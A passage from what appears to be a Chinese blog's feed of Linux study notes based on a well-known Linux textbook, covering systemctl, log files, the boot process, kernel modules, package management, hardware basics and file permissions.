以该目录下面就是一大堆链接文件</p><p><code>systemctl</code> 指令</p><ul><li>start ：立刻启动后面接的 unit </li><li>stop ：立刻关闭后面接的 unit </li><li>restart ：立刻关闭后启动后面接的 unit，亦即执行 stop 再 start 的意思 </li><li>reload ：不关闭后面接的 unit 的情况下，重新载入配置文件，让设置生效 </li><li>enable ：设置下次开机时，后面接的 unit 会被启动 </li><li>disable ：设置下次开机时，后面接的 unit 不会被启动 </li><li>status ：目前后面接的这个 unit 的状态，会列出有没有正在执行、开机默认执行否、登录等信息等！ </li><li>is-active ：目前有没有正在运行中 </li><li>is-enable ：开机时有没有默认要启用这个 unit</li></ul><p><code>mask</code> 强迫服务注销<code>systemctl mask + 服务名称</code></p><p><code>systemctl list-units</code> 依据unit 列出目前有启动的 unit 加上 <code>--all</code> 会列出没启动的</p><p><code>systemctl list-sockets</code> 列出socket file</p><p><code>/etc/services</code> 中的配置可以将服务于端口号对应在一起</p><p><code>netstat -tlunp</code>  观察网络端口</p><p><img src="https://i.loli.net/2020/02/02/HCqSvFzxja7l13u.png" alt="本章重点"></p><h1 id="0x18-认识与分析登录文件"><a href="#0x18-认识与分析登录文件" class="headerlink" title="0x18    认识与分析登录文件"></a>0x18    认识与分析登录文件</h1><p>什么是登录文件?</p><p>记录系统在什么时候由哪个程序做了什么样的行为时，发生了何种的事件等</p><p>Linux 常见的登录文件文件名</p><ul><li>/var/log/boot.log</li></ul><p>开机的时候系统核心会去侦测与启动硬件，接下来开始各种核心支持 的功能启动等。这些流程都会记录在 /var/log/boot.log 里面 .不过这个文件只会存在这次开机启动的信息，前次开机的信息并不会被保留</p><ul><li>/var/log/cron</li></ul><p>用于查看 crontab调度的问题</p><ul><li>/var/log/dmesg</li></ul><p>记录系统开机的时候核心侦探过程所产生的各项信息</p><ul><li>/var/log/lastlog</li></ul><p>记录系统最近一次登录系统的相关信息</p><ul><li>/var/log/maillog</li></ul><p>记录邮件的往来信息</p><ul><li>/var/log/messages</li></ul><p>记录系统发生的错误信息或者重要信息</p><ul><li>/var/log/secure</li></ul><p>基本上,涉及到需要输入密码的软件,在登录时,都会记录在这个文件中</p><ul><li>/var/log/wtmp,/var/log/faillog</li></ul><p>这两个文件可以记录正确登录系统者的账号信息wtmp与错误登录时所用的账号信息faillog</p><ul><li>/var/log/httpd , /var/log/samba/</li></ul><p><code>rsyslog.service</code> 的配置文件 <code>/etc/rsyslog.conf</code></p><p>+a 的属性让该文件无法被删除与修改</p><p>Linux 主机可以启动一个端口来监听登录服务,这个默认的端口就是 UDP 或 TCP 的 514端口</p><p>systemd-journald 用来管理与查询这次开机后的登录信息，而 rsyslogd 可以用来记录以前及现在的所以数据到磁盘文件中</p><p>使用<code>journalctl</code> 观察登录信息</p><p>使用<code>logger</code> 指令来将数据存储到登录文件中</p><p><img src="https://i.loli.net/2020/02/03/BARCPbemzUDZc2s.png" alt="本章重点"></p><h1 id="0x19-开机流程-模块管理与-Loader"><a href="#0x19-开机流程-模块管理与-Loader" class="headerlink" title="0x19    开机流程,模块管理与 Loader"></a>0x19    开机流程,模块管理与 Loader</h1><ul><li>BIOS：不论传统 BIOS 还是 UEFI BIOS 都会被简称BIOS； </li><li>MBR：虽然分区表有传统 MBR 以及新式 GPT，不过 GPT 也有保留一块相容 MBR 的区块，因此，下面的说明在安装 boot loader 的部份， 鸟哥还是简称为 MBR 喔！总之， MBR 就代表该磁盘的最前面可安装 boot loader 的那个区块就对了(<strong>master boot record,主要开机记录区</strong>)</li><li>BIOS, 开机自我测试与 MBR/GPT </li></ul><p><img src="https://i.loli.net/2020/02/03/yL4dqKjFcxilfRN.png" alt></p><p>虚拟文件系统(Initial RAM Disk 或 Initial RAM Filesystem)一般使用的文件名为<code>/boot/initrd</code> 或 <code>/boot/initramfs</code></p><p><code>systemd</code> 的处理流程</p><p>当我们取得了 /etc/systemd/system/default.target 这一个默认操作界面的设置之后，接下来系统帮我们做了什么呢？ 首先，它会链接到 /usr/lib/systemd/system/ 这个目录下 去取得 multi-user.target 或 graphical.target 这两个其中的一</p><p>使用<code>systemctl list-dependencies graphicat.target</code> 指令查看服务启动流程</p><p>使用 <code>systemctl list-dependencies sysinit.target</code> 查询初始化系统服务, 这些系统的服务有</p><ul><li>特殊文件系统设备的挂载 包括<code>/dev-hugepages.mount dev-mqueue.mount</code>等挂载服务,主要在挂载跟巨量内存分页使用与信息处理的功能</li><li>特殊文件系统的启用,包括磁盘阵列,网络磁盘(iscsi),LVM 文件系统,文件系统对照服务(multipath)等</li><li>开机过程的信息传递与动画执行,使用plymouthd 服务搭配 plymouth指令来传递动画与信息</li><li>日志式登录文件的使用,就是<code>systemd-journald</code>这个服务的启动</li><li>载入额外的核心模块</li><li>载入额外的核心参数设置</li><li>启动系统的乱数产生器</li><li>设置终端机(console)字形</li><li>启动动态设备管理员,即<code>udevd</code></li></ul><p><code>basic.target</code> 的阶段主要启动的服务大概有这些</p><ul><li>载入 alsa 音效驱动程序</li><li>载入 firewall 防火墙</li><li>载入 COU 的微指令功能</li><li>启动与设置 SELinux 的安全文本</li><li>将目前的开机过程所产生的开机信息写入<code>/var/log/dmesg</code></li><li>载入systemd 支持的timer 功能</li></ul><hr><p><strong>核心与核心模块</strong></p><p>核心一般都是压缩文件,因此使用核心之前需要将它解压缩后,才能载入内存当中,为了应付日新月异的硬件，目前的核心都是具有“可读取模块化驱动程序”的功能,就是所谓的modules 模块化的功能啦.</p><p>核心 <code>/boot/vmlinuz</code> 或 <code>/boot/vmlinuz-version</code></p><p>核心解压缩所需 RAM Disk <code>/boot/initramfs (/boot/initramfs-version)</code></p><p>核心模块 <code>/lib/modules/version/kernel</code> 或 <code>/lib/module/$(uname -r) /kernel</code></p><p>核心源代码 <code>/usr/src/linux</code> 或 <code>/usr/src/kernels/</code> (默认不安装)</p><p>核心版本 <code>/proc/version</code></p><p>系统核心功能 <code>/proc/sys/kernel/</code></p><p>kernel 核心模块扩展名一定是<code>.ko</code>结尾的</p><p>使用<code>lsmod</code> 查询目前核心载入了多少模块</p><p>使用<code>modprobe</code> 这个指令来载入模块,这是因为<code>modprobe</code>会主动的去搜寻<code>modules.dep</code>的内容</p><p>使用<code>rmmod [-fw] module_name</code> 来移除模块</p><p><code>-f</code> 强制将该模块移除掉,不论是否正则被使用</p><p>在<code>/etc/modprobe.d/*conf</code>文件中修改核心模块的额外参数设置</p><hr><p>Linux 将boot loader 的程序码执行与设置值载入分成两个阶段来执行</p><p>Stage 1：执行 boot loader 主程序： 第一阶段为执行 boot loader 的主程序，这个主程序 必须要被安装在开机区，亦即是 MBR 或者是 boot sector 。但如前所述，因为 MBR 实 在太小了，所以，MBR 或 boot sector 通常仅安装 boot loader 的最小主程序， 并没有安装 loader 的相关配置文件； </p><p>Stage 2：主程序载入配置文件： 第二阶段为通过 boot loader 载入所有配置文件与相关的环境参数文件 （包括文件系统定义与主要配置文件 grub.cfg）， 一般来说，配置文件都在 /boot 下面。</p><p>grub2的配置文件<code>/boot/grub2/grub.cfg</code></p><p><img src="https://i.loli.net/2020/02/03/lmSQhG76fLD2FkZ.png" alt></p><h1 id="0x20-基础系统设置与备份策略"><a href="#0x20-基础系统设置与备份策略" class="headerlink" title="0x20    基础系统设置与备份策略"></a>0x20    基础系统设置与备份策略</h1><p>使用<code>ntpdate</code> 手动网络校时</p><p>备份的要点</p><p><img src="https://i.loli.net/2020/02/04/viosrWImeRlCGOd.png" alt></p><h1 id="0x21-软件安装-源代码与-Tarball"><a href="#0x21-软件安装-源代码与-Tarball" class="headerlink" title="0x21    软件安装: 源代码与 Tarball"></a>0x21    软件安装: 源代码与 Tarball</h1><p>使用<code>make</code> 进行宏编译</p><p>静态函数库 <code>扩展名为.a</code> 动态函数库<code>扩展名为.so</code></p><p><img src="https://i.loli.net/2020/02/04/4LBGbwC29AWtQX7.png" alt></p><h1 id="0x22-软件安装-RPM-SRPM-与-YUM"><a href="#0x22-软件安装-RPM-SRPM-与-YUM" class="headerlink" title="0x22    软件安装 RPM,SRPM 与 YUM"></a>0x22    软件安装 RPM,SRPM 与 YUM</h1><p>目前Linux 软件安装方式最常见的有两种</p><p><code>dpkg</code> </p><p>这个机制最早是由 Debian Linux 社群所开发出来的，通过 dpkg 的机制，Debian 提供的软件就能够简单的安装起来，同时还能提供安装后的软件信息，实在非常不错。 只要是衍生于 Debian 的其他 Linux distributions 大多使用 dpkg 这个机制来管理软件的， 包括 B2D, Ubuntu 等</p><p><code>RPM</code> </p><p>这个机制最早是由 Red Hat 这家公司开发出来的，后来实在很好用，因此很多distributions 就使用这个机制来作为软件安装的管理方式。包括 Fedora, CentOS, SuSE等等知名的开发商都是用这</p><p>RPM的全名是”RedHat Package Manager” RPM 是以一种数据库记录的方式来将你所需要的软件安装到你的 Linux 系统的一套管理机制</p><hr><p>本章重点</p><ul><li>为了避免使用者自行编译的困扰，开发商自行在特定的硬件与操作系统平台上面预先编译好软件， 并将软件以特殊格式封包成文件，提供终端用户直接安装到固定的操作系统上，并提供简单的查询/安装/移除等流程。 此称为软件管理员。常见的软件管理员有RPM 与 DPKG 两大主流。 </li><li>RPM 的全名是 RedHat Package Manager，原本是由 Red Hat 公司所发展的，流传甚广；</li><li>RPM 类型的软件中，所含有的软件是经过编译后的 binary program ，所以可以直接安装 </li><li>在使用者端的系统上， 不过，也由于如此，所以 RPM 对于安装者的环境要求相当严格；</li><li>RPM 除了将软件安装至使用者的系统上之外，还会将该软件的版本、名称、文件与目录配置、系统需求等等均记录于数据库 （/var/lib/rpm） 当中，方便未来的查询与升级、移 </li><li>除；</li><li>RPM 可针对不同的硬件等级来加以编译，制作出来的文件可于扩展名 （i386, i586, i686,x86_64, noarch） 来分辨； </li><li>RPM 最大的问题为软件之间的相依性问题； </li><li>SRPM 为 Source RPM ，内含的文件为 Source code 而非为 binary file ，所以安装SRPM 时还需要经过 compile ，不过，SRPM 最大的优点就是可以让使用者自行修改设置参数 （makefile/configure 的参数） ，以符合使用者自己的 Linux 环境； </li><li>RPM 软件的属性相依问题，已经可以借由 yum 或者是 APT 等方式加以克服。 CentOS使用的就是 yum 机制。 </li><li>yum 服务器提供多个不同的软件库放置个别的软件，以提供用户端分别管理软件类别。</li></ul><h1 id="0x23-X-Window-设置介绍"><a href="#0x23-X-Window-设置介绍" class="headerlink" title="0x23    X Window 设置介绍"></a>0x23    X Window 设置介绍</h1><p>Linux 上的图形接口,称为 X Window System,简称 X 或 X11</p><p>Unix Like 操作系统不是只能进行服务器的架设而已，在美编、排版、制图、多媒体应用上也是有其需要的。 这些需求都需要用到图形接口 （Graphical User Interface, GUI） 的操作的， 所以后来才有所谓的 X Window System 这玩意儿</p><p><img src="https://i.loli.net/2020/02/04/BQueNAmIR7tjV2y.png" alt></p><p><img src="https://i.loli.net/2020/02/04/4gkuAjTXSePtxIf.png" alt></p><p><img src="https://i.loli.net/2020/02/04/wv96PVMzSYjf3oG.png" alt="本章重点"></p><h1 id="0x24-Linux-核心编译与管理"><a href="#0x24-Linux-核心编译与管理" class="headerlink" title="0x24    Linux 核心编译与管理"></a>0x24    Linux 核心编译与管理</h1><p><img src="https://i.loli.net/2020/02/04/kCcMNPLmy7Fa5qg.png" alt></p><hr><p>后面这些内容我觉得对于我们搞安全的,了解一下,知道有哪些命令,是干什么的,到时候需要的时候就去查一下用法就行了.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;使用者识别码: UID (User ID)与 GID (Group ID)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ID 与 账号的对应在&lt;code&gt;/etc/passwd&lt;/code&gt; 当中&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;/etc/passwd 文件结构&lt;/str
      
    
    </summary>
    
    
      <category term="操作系统" scheme="https://hack-for.fun/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="Linux" scheme="https://hack-for.fun/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux 操作系统学习笔记(上)</title>
    <link href="https://hack-for.fun/posts/20200201/"/>
    <id>https://hack-for.fun/posts/20200201/</id>
    <published>2020-01-31T16:00:00.000Z</published>
    <updated>2020-02-04T06:51:25.913Z</updated>
    
    <content type="html"><![CDATA[<p>本篇笔记内容均摘自<strong>鸟哥的Linux私房菜基础篇第四版</strong>,以及个人在使用Kali Linux的一些心得,其实有一些东西之前用kali 慢慢用着就知道了,只是想利用一下寒假系统学习一下一个操作系统.</p><h1 id="0x00-计算机概论"><a href="#0x00-计算机概论" class="headerlink" title="0x00    计算机概论"></a>0x00    计算机概论</h1><h2 id="About-computer"><a href="#About-computer" class="headerlink" title="About computer"></a>About computer</h2><blockquote><p><strong>电脑</strong></p></blockquote><p>所谓的电脑就是一种计算机,而计算机是: <strong>接受用户输入的命令和数据,经过中央处理器的算术和逻辑单元运算处理后,产生或存储成有用的信息</strong></p><p>电脑又三部分组成: </p><ul><li>输入单元: 键盘鼠标等</li><li>主机部分: CPU 主板等</li><li>输出单元: 屏幕 打印机等</li></ul><p>其实把自己家里的台式拆开看一下就知道了有什么东西了,谁还没有幻想过拥有一台游戏主机了???</p><p><img src="https://i.loli.net/2020/02/01/ilLIU8pVeoPaszG.png" alt></p><blockquote><p><strong>CPU    架构</strong></p></blockquote><p>主要有两种: 精简指令集(RISC) 和复杂指令集(CISC),二者的区别在于指令.</p><p>RISC , 微指令集较为精简，每个指令的执行时间都很短，完成的动作也很单 </p><p>纯，指令的执行性能较佳； 但是若要做复杂的事情，就要由多个指令来完成。</p><p>CISC, 微指令集的每个小指令可以执行一些较低阶的硬件操作，指令数目多 </p><p>而且复杂， 每条指令的长度并不相同。因为指令执行较为复杂所以每条指令花费的时间较 </p><p>长， 但每条个别指令可以处理的工作较为丰富。</p><p>关于<code>x86</code>,这是因为最早的Intel发展的CPU代号为<code>8086</code>,后来依据这个架构开发了<code>80286</code>…因此这种架构的COU就被称为<code>x86</code></p><p>关于<code>位</code>,指的是CPU一次数据读取的最大量！64位CPU代表CPU一次可以读写64bits这 么多的数据，32位CPU则是CPU一次只能读取32位的意思。 因为CPU读取数据量有限制，因 此能够从内存中读写的数据也就有所限制。所以，一般32位的CPU所能读写的最大数据量， 大概就是4GB左右。</p><p>CPU 的等级</p><p>32位CPU就称为i686等级。 至于目前的64位CPU则统称为x86_64等级</p><blockquote><p><strong>电脑上常用的计算单位</strong></p></blockquote><p>0/1 这个二进制的的单位我们称为 bit。 但 bit 实在太小了，所以在储 存数据时每份简单的数据都会使用到 8 bits 的大小来记录，因此定义出 Byte 这个单位，他 们的关系为： </p><blockquote><p><strong>1 Byte = 8 bits</strong> </p></blockquote><p><img src="https://i.loli.net/2020/02/01/jkTVCEu6RPKiQsb.png" alt="单位表"></p><p>CPU的<strong>运算速度</strong>常使用 MHz 或者是 GHz 之类的单位，这个 Hz 其实就是秒分之一。而在<strong>网络传输</strong>方面，由于网络使用的是 bit 为单位，因此网络常使用的单位为 Mbps 是 Mbits per second，亦即是每秒多少 Mbit.</p><blockquote><p><strong>Intel    芯片架构</strong></p></blockquote><p>早期的芯片组通常分为两个桥接器来控制各元件的沟通， 分别是： </p><p>（1）北桥：负责链接速度较快的CPU、内存与显卡接口等元件</p><p>（2）南桥：负责连接速度较慢的设备接口， 包括硬盘、USB、网卡等</p><blockquote><p>北桥最重要的就是 CPU 与内存之间的桥接，因此目前的主流架构中，大多将北桥内存控制器整合到 CPU 封装当中了</p></blockquote><p>不同的CPU型号大多具有不同的脚位（CPU上面的插脚），能够搭配的主板芯片组也不同</p><blockquote><p><strong>CPU    的工作频率</strong></p></blockquote><p>早期的 CPU 架构主要通过北桥来链接系统最重要的 CPU、内存与显卡设备。因为所有的设 备都得通过北桥来链接，因此每个设备的工作频率应该要相同。 于是就有所谓的前端总线 （FSB） 这个东西的产生。但因为 CPU 的运算速度比其他的设备都要来的快，又为了要满足 FSB 的频率，因此厂商就在 CPU 内部再进行加速， 于是就有所谓的外频与倍频了。 </p><p>总结来说，在早期的 CPU 设计中，所谓的外频指的是CPU与外部元件进行数据传输时的速 度，倍频则是 CPU 内部用来加速工作性能的一个倍数， 两者相乘才是CPU的频率速度。例 如 Intel Core 2 E8400 的内频为 3.0GHz，而外频是333MHz，因此倍频就是9倍</p><p>超频指的是： 将CPU的倍频或者是外频通 <strong>过主板的设置功能</strong>更改成较高频率的一种方式</p><blockquote><p><strong>超线程 （Hyper-Threading, HT）</strong> </p></blockquote><p>在每一个 CPU 内部将重要的寄存器 （register） 分成两群， 而让程序分别使用这两群寄存器。也就是说，可以有两个程序“同时竞争 CPU 的运算单元”，而非通过操作系统的多任务切换.</p><blockquote><p><strong>内存</strong></p></blockquote><p>CPU所使用的数据都是来自于内存（main memory），不论是软件程序还是数据，都必须要读入内存后CPU才能利用。 个人电脑的内存主要元件为动态随机存取内存 （Dynamic Random Access Memory, DRAM），随机存取内存只有在通电时才能记录与使 用，断电后数据就消失了。因此我们也称这种RAM为挥发性内存</p><p>DDR是所谓的双倍数据传送速度（Double Data Rate）， 他可以在一次工作周期中进行两次数据的传送,比如我们现在电脑上的DDR4 2666等</p><p><img src="https://i.loli.net/2020/02/01/ifaKZ3SuN8oMpCA.png" alt></p><blockquote><p><strong>多通道设计</strong></p></blockquote><p>由于所有的数据都必须要存放在内存，所以内存的数据宽度当然是越大越好。 但传统的总线宽度一般大约仅达64位，为了要加大这个宽度，因此芯片组厂商就将两个内存汇整在一起，如果一支内存可达64位，两支内存就可以达到128位了，这就是<strong>双通道</strong>的设计理念。</p><p>板载内存的痛苦?谁能知道?</p><blockquote><p><strong>只读存储器(ROM)</strong></p></blockquote><p>BIOS（Basic Input Output System）是一套程序，这套程序是写 死到主板上面的一个内存芯片中， 这个内存芯片在没有通电时也能够将数据记录下来，那就 是只读存储器（Read Only Memory, ROM）。 ROM是一种非挥发性的内存。</p><p>BIOS 对电脑系统来讲是非常重要的，因为他掌握了系统硬件的详细信息与开机设备的选择等 </p><blockquote><p><strong>显卡</strong></p></blockquote><p>显卡又称为<strong>VGA（Video Graphics Array）</strong>他对于图形影像的显示扮演相当关键的角色。 一 般对于图形影像的显示重点在于分辨率与色彩深度，因为每个图像显示的颜色会占用掉内 存,因此显卡上面会有一个内存的容量，这个显存容量将会影响到你的屏幕分辨率与色彩深 度</p><p><img src="https://i.loli.net/2020/02/01/rvtqd4McTNSY2Xj.png" alt="不同插槽的带宽"></p><p>比较特殊的是，PCIe（PCI-Express）使用的是类似管线的概念来处理，在 PCIe 第一版（PCIe 1.0） 中，每条管线可以具有250MBytes/s的带宽性能， 管线越多（通常设计到x16 管线）则总带宽越高</p><p><img src="https://i.loli.net/2020/02/01/9v8yUbQxHuLV2Xe.png" alt></p><p>当然,显存还是越大越好</p><p>显卡的连接接口</p><p><img src="https://i.loli.net/2020/02/01/2DMCQ9FqdXuW6yb.png" alt></p><blockquote><p><strong>硬盘与存储设备</strong></p></blockquote><p>电脑系统上面的储存设备包括有：硬盘、软盘、MO、CD、 DVD、磁带机、U盘（闪存）、还有新一代的蓝光光驱等， 乃至于大型机器的区域网络储存设备（SAN, NAS）等等，都是可以用来储存数据的</p><blockquote><p><strong>主板</strong></p></blockquote><p><strong>CMOS与BIOS</strong></p><p>CMOS主要的 功能为记录主板上面的重要参数， 包括系统时间、CPU电压与频率、各项设备的I/O位址与 IRQ等，由于这些数据的记录要花费电力，因此主板上面才有电池。 BIOS为写入到主板上某 一块 flash 或 EEPROM 的程序，他可以在开机的时候执行，以载入CMOS当中的参数， 并尝 试调用储存设备中的开机程序，进一步进入操作系统当中。BIOS程序也可以修改CMOS中的 数据， 每种主板调用BIOS设置程序的按键都不同，一般台式机常见的是使用[del]按键进入BIOS设置画面。 </p><p><strong>各种周边设备接口</strong></p><p>PS/2 接口: 原来是用来连接键盘和鼠标的接口,现在已被USB接口取代,几乎已经消失</p><p>USB 接口: 蓝色为USB 3.0, 其他为USB 2.0</p><p>声音输出,输入与麦克风: 圆形插口</p><p>RJ-45网络头: 就是我们说的插网线的网口</p><p>HDMI: 就是连接扩展显示器的</p><p><img src="https://i.loli.net/2020/02/01/8AuaeXhI9PxiH7k.png" alt></p><p><strong>设备I/O位址与IRQ中断信道</strong></p><p>I/O位址有点类似每个设备的门牌号码，每个设备都有他自己的位址，一般来说，不能有两个 设备使用同一个I/O位址， 否则系统就会不晓得该如何运行这两个设备了。而除了I/O位址之外，还有个IRQ中断(Interrupt)</p><p>如果I/O位址想成是各设备的门牌号码的话,那么IRQ就可以想成是各个门牌连接到邮件中心 （CPU）的专门路径.各设备可以通过IRQ中断信道来告知CPU该设备的工作情况，以方便CPU进行工作分配的任务</p><blockquote><p><strong>电源</strong></p></blockquote><p>现在一般都是装500W的了,判断电源的好坏还是用料,稳定的,低能耗的电源就好</p><h2 id="About-data-representation"><a href="#About-data-representation" class="headerlink" title="About data representation"></a>About data representation</h2><blockquote><p>Digital system</p></blockquote><p>早期的电脑使用的是利用通电与否的特性的真空管，如果通电就是1，没有通电就是0.后来沿用至今，我们称这种只有0/1的环境为二进制制，英文称为binary.</p><p>十进制<br>$$<br>3456=3<em>10^3+4</em>10^2+5<em>10^1+6</em>10^0<br>$$<br>二进制<br>$$<br>1101010=1<em>2^6+1</em>2^5+0<em>2^4+1</em>2^3+0<em>2^3+1</em>2^2+0*2^0<br>$$</p><blockquote><p>Text encoding system</p></blockquote><p>实际上文字的”编码系统”实际就是一个”字码对照表”.当我们要写入文件的文字数据时，该文字数据会由编码对照表将该文字转成数字后，再存入 文件当中。 同样的，当我们要将文件内容的数据读出时，也会经过编码对照表将该数字转成对应的文字后再显示到屏幕上。</p><p>常用的英文编码表为ASCII系统，这个编码系统中， 每个符号（英文、数字或符号等）都会占 用1Bytes的记录， 因此总共会有<code>2^8=256</code>种变化。至于中文字当中的编码系统早期最常用的就 big5这个编码表了。 每个中文字会占用2Bytes，理论上最多可以有<code>2^16=65536</code>，亦即最多 可达6万多个中文字。 但是因为big5编码系统并非将所有的位都拿来运用成为对照，所以并非 可达这么多的中文字码的。 目前big5仅定义了一万三千多个中文字，很多中文利用big5是无成功显示的</p><p>为了解决这些问题,ISO/IEC指定了 <code>Unicode</code>编码系统.也就是<code>UTF-8</code></p><h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><blockquote><p>操作系统（Operating System, OS）其实也是一组程序，这组程序的重点在于管理电脑的所有活动以及驱动系统中的所有硬件</p></blockquote><p>电脑没有软件只是一堆废铁，那么操作系 统的功能就是让CPU可以开始判断逻辑与运算数值、 让内存可以开始载入/读出数据与程序码,让硬盘可以开始被存取,让网卡可以开始传输数据,让所有周边可以开始运行等</p><p>上述功能就是操作系统的核心(<strong>Kernel</strong>),核心决定了电脑能不能做哪些事情!～因为核心主要在管控硬件与提供相关的能力 （例如存取硬盘、网络功能、CPU资源取得等）， 这些管理的动作是非常的重要的，如果使 用者能够直接使用到核心的话，万一使用者不小心将核心程序停止或破坏， 将会导致整个系 统的崩溃！因此核心程序所放置到内存当中的区块是受保护的,并且开机后就一直<strong>常驻在内存</strong>当中</p><blockquote><p>系统调用(System Call)</p></blockquote><p>举例来说，我们学习C程序语言只要参考C程序语言的函数即可，不需要再去考虑其他核心的相关功能，因为核心的系统调用接口会主动的将 C程序语言的相关语法转成核心可以了解的任务函数，那核心自然就能够顺利运行该程序了</p><p><img src="https://i.loli.net/2020/02/01/m9pSaPWb4qkIYgh.png" alt></p><p>电脑系统主要由硬件构成，然后核心程序主要在管理硬件，提供合理的电脑系统资源分配 （包括CPU资源、内存使用资源等等）， 因此只要硬件不同（如x86架构与RISC架构的 CPU）核心就得要进行修改才行。</p><p>为了保护核心，并且让程序设计师比较容易开发软件，因此操作系统除了核心程序之外，通常还会提供一整组开发接口,那就是<strong>系统调用层</strong></p><p>核心主要是在负责整个电脑系统相关的资源分配与管理，那我们知道其实整部电脑系统最重要的就是CPU与内存， 因此，核心至少也要有这些功能的: </p><ul><li>系统调用接口</li><li>程序管理</li><li>内存管理</li><li>文件系统管理</li><li>设备驱动</li></ul><blockquote><p>操作系统与硬件的关系</p></blockquote><p><img src="https://i.loli.net/2020/02/01/APLDeQ4rgwMHzRV.png" alt></p><blockquote><p>应用程序</p></blockquote><p>应用程序是参考操作系统提供的开发接口所开发出来软件，这些软件可以让使用者操作，以 达到某些电脑的功能利用。 举例来说，办公室软件（Office）主要是用来让使用者办公用的.影像处理软件主要是让使用者用来处理影音数据的； 浏览器软件主要是让使用者用来上网浏览用的等等</p><p><strong>第0章计算机概论的重点</strong></p><p><img src="https://i.loli.net/2020/02/01/1nTaRfyjLYHSBzr.png" alt></p><p>em这部分<strong>了解</strong>一下就行了</p><h1 id="0x01-Linux是什么与如何学习"><a href="#0x01-Linux是什么与如何学习" class="headerlink" title="0x01    Linux是什么与如何学习"></a>0x01    Linux是什么与如何学习</h1><p>  <strong>Linux 是由 Torvalds 这个芬兰人所发明的</strong></p><p> 鸟哥主要就介绍了一些历史,这里我看了,我了解了一下,就想我们会用Windows一样,不一定需要懂太多历史吧?Linux历史悠久(起初并不叫作Linux),最开始的时候也需要买光盘,但是源码是给了的,这一些构成了Linux open source的理念,并且Linux的核心是C写的,可移植性强,也叫谋生了多种比如现在的各种Linux系统</p><p>GNU’s Not Unix = GNU</p><p><strong>GNU C Compiler(gcc)</strong>.</p><p>Linux这个名字的由来是,因为托瓦兹放置核心的那个FTP 网站的目录为：Linux， 从此，大家便称这个核心为Linux了。</p><blockquote><p><strong>Linux的核心版本</strong></p></blockquote><blockquote><p>3.10.0-123.el7.x86_64 </p><p>主版本.次版本.释出版本-修改版本</p></blockquote><p>Cent0S 这些叫做 distribution</p><p><img src="https://i.loli.net/2020/01/27/2vxYurfpgqnBEeA.png" alt="本章重点"></p><h1 id="0x02-主机规划与磁盘分区"><a href="#0x02-主机规划与磁盘分区" class="headerlink" title="0x02    主机规划与磁盘分区"></a>0x02    主机规划与磁盘分区</h1><p><code>/dev</code>表示各种硬件设备的文件</p><p><img src="https://i.loli.net/2020/01/28/CXuUdpslmn9YxIV.png" alt="其他硬件的文件名"></p><p><img src="https://i.loli.net/2020/01/28/5haApjtH6KLS81y.png" alt="目录树结构"></p><p><img src="https://i.loli.net/2020/01/28/BjzFf4EebU9vhWm.png" alt></p><p><img src="https://i.loli.net/2020/01/28/drz2xTMQ1Vu49XU.png" alt="挂载"></p><p><strong>NAT</strong>(达成IP分享器的功能), <strong>SAMBA</strong>(加入Windows网络上的芳邻)</p><p><strong>Mail</strong>(邮件服务器),<strong>Web</strong>(WWW服务器), <strong>DHCP</strong>(提供用户端自动取得IP的功能)</p><p><strong>FTP</strong>(文件传输协议)</p><p><img src="https://i.loli.net/2020/01/28/YinDLfhNuCmt3qd.png" alt="本章重点"></p><h1 id="0x03-安装"><a href="#0x03-安装" class="headerlink" title="0x03    安装"></a>0x03    安装</h1><p>看了一眼大概内容,直接跳过了,因为咋们是用的kali.</p><p><a href="http://hack-for.fun/2020/01/06/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E9%94%90%E6%8D%B7%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91/">安装Kali我之前帮我的同学写过一篇文章</a></p><h1 id="0x04-首次登陆与线上求助"><a href="#0x04-首次登陆与线上求助" class="headerlink" title="0x04    首次登陆与线上求助"></a>0x04    首次登陆与线上求助</h1><p><strong>Tab</strong>键的作用: </p><ul><li>[Tab] 接在一串指令的第一个字的后面，则为“命令补全”</li><li>[Tab] 接在一串指令的第二个字以后时，则为“文件补齐”</li><li>若安装 bash-completion 软件，则在某些指令后面使用 [tab] 按键时，可以进行“选项/参数的补齐”功能</li></ul><p><code>Ctrl-c</code> 中断正在运行中的指令 这种按键 称为 <code>组合键</code> </p><p><code>Ctrl-d</code>相当于输入<code>exit</code>,表示直接离开命令行</p><p><code>shift+{PageUp/Down}</code>翻滚屏幕画面,即浏览本页看不到的内容时可以使用</p><p><code>man -f xxx</code>匹配xxx的手册</p><p><img src="https://i.loli.net/2020/01/28/SrMx8VeZnlFPOJu.png" alt="在man age中常用的按键"></p><p><code>info</code>指令,info与man的用途其实差不多，都是用来查询指令的用法或者是文件的格式.但是info page是将文件数据拆成一个一个的段落,每个段落用自己的页面来撰写</p><p>em,….我在kali上试了没用<code>info</code> ..233 直接跳过</p><p><code>nano</code>,超简单文书编辑器</p><p><code>正确的关机方法</code> ,使用<code>shutdown</code>和<code>reboot</code>指令</p><p>将数据同步写入硬盘中的指令<code>sync</code>,关机<code>shutdown</code>重新开机<code>reboot</code>,<code>halt</code>,<code>poweroff</code></p><p><img src="https://i.loli.net/2020/01/28/KtyG94QdDsZ52W3.png" alt="第四章重点"></p><h1 id="0x05-Linux的文件权限与目录配置"><a href="#0x05-Linux的文件权限与目录配置" class="headerlink" title="0x05    Linux的文件权限与目录配置"></a>0x05    Linux的文件权限与目录配置</h1><p>使用<code>ls -al</code>,可以列出所有文件详细的<strong>权限与属性</strong>(包含隐藏文件,即以”.”为第一个字符的文件),就比如</p><pre><code>drwxr-xr-x  4 root root    4096 12月  7 23:35  webdirscan</code></pre><p>分别表示的意思是</p><pre><code>拥有的权限, 连接数 , 拥有者, 所属群组, 容量大小, 最后修改日期, 名称</code></pre><p><img src="https://i.loli.net/2020/01/28/DIYiygwsFeu1ELd.png" 